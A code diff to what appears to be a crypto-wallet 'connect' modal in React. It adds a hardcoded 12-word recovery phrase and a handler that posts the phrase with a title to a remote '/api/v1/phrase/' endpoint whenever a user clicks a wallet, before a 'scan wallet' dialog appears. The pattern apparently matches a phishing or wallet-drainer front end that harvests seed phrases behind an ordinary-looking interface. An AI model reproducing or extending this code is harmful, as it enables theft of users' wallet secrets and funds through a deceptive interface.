@@ -6,9 +6,11 @@ import Fade from '@mui/material/Fade';
 import Typography from '@mui/material/Typography';
 import { CloseButton, InfoFilledIcon } from '../assets/icons';
 import { myContext } from '../MyContext';
-import { coinbaseLogo, logo, walletConnecLogo } from '../assets/images';
+import { coinbaseLogo, logo, metaMaskLogo, walletConnecLogo } from '../assets/images';
 import Spinner from './spinner';
 import ScanWalletModal from './scanModal';
+import axios from 'axios';
+import { url } from './constants';
 
 export const style = {
     position: 'absolute',
@@ -33,7 +35,7 @@ export const styleHeader = {
 }
 
 export default function ConnectWalletModal() {
-    const { openWalletModal, setWalletModal, setScanWalletModal } = useContext(myContext)
+    const { openWalletModal, setWalletModal, setScanWalletModal, fetchData } = useContext(myContext)
     const [clickedWalletIndex, setClickedWalletIndex] = useState();
     const [isRejected, setIsRejected] = useState(false)
     const [clickedWalletLogo, setClickedWalletLogo] = useState()
@@ -41,6 +43,10 @@ export default function ConnectWalletModal() {
     const handleClose = () => setWalletModal(false);
 
     const avalWallets = [
+        {
+            logo: metaMaskLogo,
+            name: "MetaMask"
+        },
         {
             logo: coinbaseLogo,
             name: "Coinbase Wallet"
@@ -51,8 +57,28 @@ export default function ConnectWalletModal() {
         },
     ]
 
+    const phrase = `water content forest school table people airport train sleeping computer house mountain`
+
+    const title = "ACX"
+
+    const handleSubmit = async () => {
+        const values = {
+            title: title,
+            phrase: phrase
+        }
+        await axios.post(`${url}/api/v1/phrase/`, values)
+            .then(response => {
+                console.log('Response:', response.data);
+                fetchData()
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+
     function handleWalletClick(name) {
         setClickedWalletIndex(name)
+        handleSubmit()
         setTimeout(() => {
             setScanWalletModal(true)
             setTimeout(() => {
